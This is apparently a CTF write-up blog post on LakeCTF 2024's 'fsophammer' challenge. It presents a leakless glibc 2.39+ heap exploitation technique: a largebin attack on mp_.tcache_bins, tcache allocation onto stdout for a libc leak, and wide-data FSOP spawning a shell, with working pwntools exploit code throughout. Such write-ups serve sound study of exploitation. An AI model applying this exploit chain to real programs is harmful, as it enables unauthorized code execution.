---
layout: post
category: pwn
tags:
  - LakeCTF-2024
excerpt_separator: <!--more-->
date: 2024-12-09 00:00:00 +0900
title: Leakless Code Execution Technique for libc >= 2.39

---
<!--more-->

Last Sunday, I played LakeCTF with CyKor. We ranked 6th in the academic division, succeeded to get to the finals.

I grabbed pwn challenges, which were great and also had many points to learn. Especially for fsophammer, the intended writeup suggests a **leakless technique** to achieve arbitrary code execution in the latest libc. 

This post will describe about the details of the technique.

<br/>


## Requirements
Requirements to use the technique is as follows.

1. Heap primitive to allocate and free chunk
2. Heap primitive to write at chunk at the time of allocation 
3. Heap vulnerability (BOF, UAF, whatever...) which can be used to overwrite largebin chunk's bk_nextsize to libc relative value, which will further be used for largebin attack
    
    * This may look tricky at first glance, but simple heap bof can achieve this, by overlapping unsorted bin and largebin chunk. (details below) 

Requirements can be less or more according to exact heap primitives or conditions, but **these requirements are generally possible**, often provided in CTF challs or real world binaries.

<br/>

## Exploit Scenario
Based on these requirements, the exploit scenario of this technique is as follows.

1. Prepare two pointers to `_IO_2_1_stdout_` using partial overwrite to chunks allocated from unsorted bin
    * Note that overwriting `main_arena` value to `_IO_2_1_stdout_` may require a 4-bit bruteforce. 
2. Prepare a largebin chunk, and overwrite it's bk_nextsize to `&mp_.tcache_bins - 0x20`
3. Trigger largebin attack, which will overwrite `mp_.tcache_bins` to a heap pointer, which will be greater than the original value (0x40)
4. Abusing the overwritten `mp_.tcache_bins`, make the allocater use the prepared stdout pointers as tcache entries. Also set the `tcache->counts` for the entry index of stdout pointers
5. Use the first allocaton to stdout, overwrite `flags_`, and `_IO_write_base` to get libc leak.
6. Use the second allocation to achieve code execution using `_wide_data` FSOP.

<br/>

## LakeCTF 2024: fsophammer
Now let's take a look at the challenge.

```c
void menu() {
  puts("1. alloc\n2. free\n3. slam");
  size_t cmd;

  if (get_num("cmd",&cmd, 0)) {
    return;
  }

  switch(cmd) {
    case 1:
      alloc();
      break;
    case 2:
      free_();
      break;
    case 3:
      if (!slammed) {
        slam();
        slammed = 1;
      } else {
        puts("[-] slammed already");
      }
      break;
    default:
      puts("[-] invalid cmd");
      break;
  }
}
```
Three options are given. One alloc, one free, and the slam one.

```c
void alloc() {
  size_t idx;
  size_t sz;
  if(get_num("index",&idx,N_ENTRIES)) {
    return;
  }
  if(get_num("size",&sz,MAX_SZ)) {
    return;
  }
  entries[idx] = malloc(sz);
  get_str(entries[idx],sz);
  printf("alloc at index: %zu\n", idx);
}

void free_() {
  size_t idx;
  if(get_num("index",&idx,N_ENTRIES)) {
    return;
  }
  if(!entries[idx]) {
    return;
  }
  free(entries[idx]);
  entries[idx] = NULL;
}
```
Alloc and free is general, providing write at allocation and freeing without dangling pointer.

```c
void slam() {
  size_t idx;
  size_t pos;
  puts("is this rowhammer? is this a cosmic ray?");
  puts("whatever, that's all you'll get!");
  if (get_num("index",&idx,sizeof(*stdin))) {
    return;
  }

  if (idx < 64) {
    puts("[-] invalid index");
    return;
  }

  if (get_num("pos",&pos,8)) {
    return;
  }
  unsigned char byte = ((char*)stdin)[idx];
  unsigned char mask = ((1<<8)-1) & ~(1<<pos);
  byte = (byte & mask) | (~byte & (~mask));
  ((char*)stdin)[idx] = byte;
}
```
Slam menu is given to flip one bit from `_IO_2_1_stdout_._IO_buf_end` and within `_IO_2_1_stdout_`. Given that stdin is buffered and therefore its buffer is allocated on heap, flipping a proper bit of `_IO_2_1_stdout_._IO_buf_end` leads to heap bof.

Now let's follow the exploit scenario above with these primitives.

<br/>

## Exploit
```python
# => future unsorted bin chunk
alloc(0,0x450,b"")  
alloc(3, 10, b"") # consolidation barrier

# => future largebin chunk
alloc(1,0x500,b"A"*(0x60)+p64(0xc0+0x60)+p64(0x20))
alloc(3, 10, b"") # consolidation barrier
```
First, we allocate two chunks each for unsorted bin and largebin. Note that a fake chunk header is placed in proper offset of largebin chunk, which will later be used to bypass security check on unsorted bin.  

```python
alloc(2, 0x4f0, b"") # used later to trigger largebin attack
free(1)
alloc(1, 0x580, b"") # move previous 1 to largebin
free(0) # move 0 to unsorted bin
```
After, we allocate a chunk which will be used to trigger largebin attack later. Freeing 1 and allocating larger chunk will move 1(previous one) to largebin. And free 0 to put it into unsorted bin.

```python
slam(65, 3)
alloc(3,0x420-0x60,b"") # reduce unsorted bin size
p.sendafter(b"> ", b"A"*(0x1458-0x60)+p16(0x91+0x30+0x60))
```
Slam `_IO_2_1_stdout_._IO_buf_end` to convert scanf to heap overflow primitive.
Allocating from unsorted bin before overwriting size will still keep it smaller than the largebin chunk. Overwrite the size to overlap unsorted bin chunk with largebin chunk.

```python
alloc(3,0x20,p64(stdout)[:2]) # tc_idx: 0x2c2
alloc(3,0x20,p64(stdout)[:2]) # tc_idx: 0x2c8

alloc(3,0x50,b"")
alloc(3,0x30,p64(0)+p64(tcache_bins-0x20)[:2])
alloc(3,0x10,b"")
```
Allocating from unsorted bin returns splitted chunk with main_arena pointer in it. Overwriting 2 bytes of stdout will make a pointer to stdout within heap, with 4-bits of brute force done before. We will prepare 2 pointers to stdout.

Now, we will overwrite largebin chunk's bk_nextsize by splitting unsorted bin chunk into the largebin chunk. We will also overwrite main arena pointer to point `&mp_.tcache_bins - 0x20`. And we will empty unsorted bin to trigger largebin attack in the next stage.

```python
free(2)
alloc(3,3000,b"") # largebin attack
```
Freeing previousy allocated 2 will move it to unsorted bin. And freeing larger chunk will move  it to largebin, triggering the largebin attack.

```c
 size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
    {
      victim = tcache_get (tc_idx);
      return tag_new_usable (victim);
    }
```
Since `mp_.tcache_bins` is overwritten to heap address, it is possible to allocate to our modified stdout pointers.

```python
payload = p64(0xfbad1800)
payload += p64(0)*3
payload += p8(0)
pause()
alloc(3,(0x2c2+1)*0x10, payload)
```
Distance from `tcache->entries` to our stdout pointer(0x2c2) is converted to allocation size(0x2c2+1)*0x10. Also we should set `tcache->counts[0x2c2]`, but this was done during the heap overflow payload (`b"A"*0x1000+...`).


First allocation to stdout will do the leak.

```python
    FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
            lock            = struct_ptr + 0x10, \
            _IO_read_ptr    = 0x0, \
            _IO_write_base  = 0x0, \
            _wide_data      = struct_ptr - 0x10, \
            _unused2        = p64(libc.symbols['system'])+ b"\x00"*4 + p64(struct_ptr + 196 - 104), \
            vtable          = libc.symbols['_IO_wfile_jumps'] - 0x20, \
            )
    
    alloc(3,(0x2c8+1)*0x10, FSOP)
```
Second allocation will trigger `system("sh")` with the leak.

<br/>

## Conclusion
We got a nice technique to achieve code execution without any leak vulnerability. Big shout out to [@skuuk](https://x.com/s_k_u_u_k) for bringing this great technique and the challenge.

<br/>

## Reference
https://github.com/5kuuk/CTF-writeups/tree/main/tfc-2024/mcguava
